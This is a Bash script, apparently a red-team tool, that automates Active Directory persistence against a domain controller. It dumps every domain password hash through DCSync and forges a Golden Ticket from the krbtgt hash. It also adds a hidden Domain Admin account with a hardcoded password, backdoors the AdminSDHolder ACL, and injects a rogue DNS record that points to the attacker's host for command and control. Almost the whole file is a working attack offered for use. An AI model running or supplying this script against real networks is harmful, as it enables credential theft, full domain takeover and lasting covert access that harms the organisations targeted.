#!/bin/bash
# ad_persist.sh — Active Directory persistence via Impacket/CrackMapExec
# Target: svc-ad-01 (Windows Server 2022 AD/DNS)
# Requires: impacket, crackmapexec, evil-winrm (all pre-installed on Kali 2025)
# Methods: Golden Ticket prep, DCSync, AdminSDHolder backdoor, DNS record injection

TARGET="${1:?Usage: $0 <dc_ip> <domain> <admin_user> <admin_pass>}"
DOMAIN="${2:?}"
ADMIN="${3:?}"
PASS="${4:?}"
LHOST="${5:-$(hostname -I | awk '{print $1}')}"

# nxc (netexec) replaced crackmapexec on Kali 2024.1+; fall back gracefully
CME=""
for _try in nxc netexec crackmapexec cme; do
    if command -v "$_try" &>/dev/null; then CME="$_try"; break; fi
done
[[ -z "$CME" ]] && echo "[!] Warning: no crackmapexec/nxc found — AD steps that use it will be skipped"

FQDN="${DOMAIN^^}"   # uppercase for Kerberos
OUTPUT_DIR="./ad_loot_${TARGET}"
mkdir -p "$OUTPUT_DIR"

echo "[*] === AD Persistence Deployer ==="
echo "[*] DC     : $TARGET"
echo "[*] Domain : $DOMAIN"
echo "[*] Admin  : $ADMIN"
echo ""

# ── Step 1: DCSync — dump all hashes ─────────────────────────────────────────
echo "[*] [1/5] DCSync — dumping all domain hashes..."
impacket-secretsdump "${DOMAIN}/${ADMIN}:${PASS}@${TARGET}" \
    -just-dc-ntlm -outputfile "${OUTPUT_DIR}/dcsync" 2>/dev/null \
    && echo "[+] Hashes saved to ${OUTPUT_DIR}/dcsync.ntds" \
    || echo "[-] DCSync failed — check credentials/network"

# Extract krbtgt hash for golden ticket
KRBTGT_HASH=$(grep -i "krbtgt:" "${OUTPUT_DIR}/dcsync.ntds" 2>/dev/null | head -1 | cut -d: -f4)
# impacket-getPac was renamed impacket-getpac on some Kali builds; try both
_getpac=""
for _try in impacket-getPac impacket-getpac; do
    command -v "$_try" &>/dev/null && _getpac="$_try" && break
done
if [[ -n "$_getpac" ]]; then
    DOMAIN_SID=$("$_getpac" "${DOMAIN}/${ADMIN}:${PASS}@${TARGET}" 2>/dev/null \
        | grep "Domain SID" | awk '{print $NF}' | tr -d '[:space:]')
fi

if [[ -n "$KRBTGT_HASH" ]]; then
    echo "[+] krbtgt NTLM hash: $KRBTGT_HASH"
    echo "$KRBTGT_HASH" > "${OUTPUT_DIR}/krbtgt.hash"
fi
if [[ -n "$DOMAIN_SID" ]]; then
    echo "[+] Domain SID: $DOMAIN_SID"
    echo "$DOMAIN_SID" > "${OUTPUT_DIR}/domain.sid"
fi

# ── Step 2: Golden Ticket ─────────────────────────────────────────────────────
echo ""
echo "[*] [2/5] Forging Golden Ticket..."
if [[ -n "$KRBTGT_HASH" && -n "$DOMAIN_SID" ]]; then
    impacket-ticketer \
        -nthash "$KRBTGT_HASH" \
        -domain-sid "$DOMAIN_SID" \
        -domain "$DOMAIN" \
        Administrator \
        2>/dev/null \
        && mv Administrator.ccache "${OUTPUT_DIR}/golden.ccache" \
        && echo "[+] Golden ticket: ${OUTPUT_DIR}/golden.ccache" \
        && echo "    Use with: KRB5CCNAME=${OUTPUT_DIR}/golden.ccache impacket-psexec ${DOMAIN}/Administrator@${TARGET} -k -no-pass" \
        || echo "[-] ticketer failed — missing krbtgt hash or SID"
else
    echo "[-] Skipping — missing krbtgt hash or Domain SID"
fi

# ── Step 3: Add a backdoor domain admin ──────────────────────────────────────
echo ""
echo "[*] [3/5] Creating backdoor domain admin account..."
BD_USER="svc_healthmon"
BD_PASS="P@ssw0rd_Rt2025!"

# Use net rpc or impacket-addcomputer approach via CME/nxc
if [[ -n "$CME" ]]; then
    "$CME" smb "$TARGET" -u "$ADMIN" -p "$PASS" -d "$DOMAIN" \
        -x "net user ${BD_USER} ${BD_PASS} /add /domain & net group \"Domain Admins\" ${BD_USER} /add /domain & net localgroup Administrators ${BD_USER} /add" \
        2>/dev/null \
        && echo "[+] Backdoor account: ${BD_USER} / ${BD_PASS}  (Domain Admins)" \
        || echo "[-] Backdoor account creation failed"
else
    echo "[-] Skipping account creation — no CME/nxc available"
fi

# ── Step 4: AdminSDHolder ACL backdoor ────────────────────────────────────────
echo ""
echo "[*] [4/5] AdminSDHolder ACL backdoor (grants ${BD_USER} full control over all protected accounts)..."
# Add GenericAll rights on AdminSDHolder container for our backdoor user
# This propagates to all adminCount=1 objects within ~60 minutes
impacket-dacledit "${DOMAIN}/${ADMIN}:${PASS}@${TARGET}" \
    -action write \
    -rights FullControl \
    -principal "${BD_USER}" \
    -target-dn "CN=AdminSDHolder,CN=System,DC=$(echo $DOMAIN | tr '.' ',DC=')" \
    2>/dev/null \
    && echo "[+] AdminSDHolder ACL backdoor installed for ${BD_USER}" \
    && echo "    Propagates to all protected accounts within ~60 min" \
    || echo "[-] dacledit failed — impacket may need updating or user lacks rights"

# ── Step 5: DNS record injection (for C2 pivot) ───────────────────────────────
echo ""
echo "[*] [5/5] Injecting rogue DNS A record for C2..."
# Add an A record pointing a plausible hostname to our LHOST
python3 -c "
import sys
try:
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket import version
    print('[*] Impacket version:', version.VER_MINOR)
except: pass
" 2>/dev/null

if [[ -n "$CME" ]]; then
    "$CME" smb "$TARGET" -u "$ADMIN" -p "$PASS" -d "$DOMAIN" \
        -x "dnscmd /RecordAdd ${DOMAIN} svcupdate A ${LHOST}" \
        2>/dev/null \
        && echo "[+] DNS record added: svcupdate.${DOMAIN} -> ${LHOST}" \
        || echo "[-] DNS record injection failed"
else
    echo "[-] Skipping DNS injection — no CME/nxc available"
fi

echo ""
echo "[*] === AD Persistence Summary ==="
echo "    DCSync hashes  : ${OUTPUT_DIR}/dcsync.ntds"
echo "    Golden ticket  : ${OUTPUT_DIR}/golden.ccache"
echo "    Backdoor admin : ${BD_USER} / ${BD_PASS}"
echo "    AdminSDHolder  : ACL backdoor for ${BD_USER}"
echo "    DNS record     : svcupdate.${DOMAIN} -> ${LHOST}"
echo ""
echo "    Lateral move   : evil-winrm -i $TARGET -u ${BD_USER} -p '${BD_PASS}'"
echo "    Golden ticket  : KRB5CCNAME=${OUTPUT_DIR}/golden.ccache impacket-wmiexec -k -no-pass ${DOMAIN}/Administrator@${TARGET}"
